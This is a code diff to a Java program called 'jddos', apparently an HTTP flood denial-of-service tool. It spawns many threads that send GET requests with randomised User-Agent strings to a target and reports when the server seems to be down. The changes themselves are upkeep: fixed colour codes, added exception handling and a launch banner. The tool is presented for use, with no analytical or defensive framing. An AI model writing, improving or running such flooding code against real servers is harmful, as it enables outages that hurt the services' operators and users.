@@ -1,4 +1,5 @@
 import java.util.Random;
+import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.Scanner;
@@ -31,7 +32,7 @@ class httpcon implements Runnable{
                 connection.setRequestMethod("GET");
                 connection.setRequestProperty("User-Agent", user_agent());
                 if (connection.getResponseCode() != 200){
-                    System.out.println("\u001B[34 Error: Server might be down \u001B[0");
+                    System.out.println("\u001B[34m Error: Server might be down \u001B[0m");
                 }
                 //System.out.println(connection.getResponseCode());
             } catch (Exception e) {
@@ -45,12 +46,22 @@ public class jddos{
     public static String platform = System.getProperty("os.name").toLowerCase();
     
     public static void clear_system(){
-        if(Windows()){new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();}
-        if(Windows()){new ProcessBuilder("clear").inheritIO().start().waitFor();}
-        if(Mac()){new ProcessBuilder("clear").inheritIO().start().waitFor();}
+        try {
+            if(Windows()){new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();}
+            if(Windows()){new ProcessBuilder("clear").inheritIO().start().waitFor();}
+            if(Mac()){new ProcessBuilder("clear").inheritIO().start().waitFor();}
+        }catch(InterruptedException e){
+            e.getStackTrace();
+        }
+        catch (IOException e) {
+            e.getStackTrace();
+        }
+
     }
 
     public static void main(String[] args) {
+        clear_system();
+        System.out.println("\u001B[32m  [+]Launched Connection \u001B[0m");
         try {
             for (int x = 0; x< Integer.parseInt(args[1]); x++){
                 httpcon obj = new httpcon();
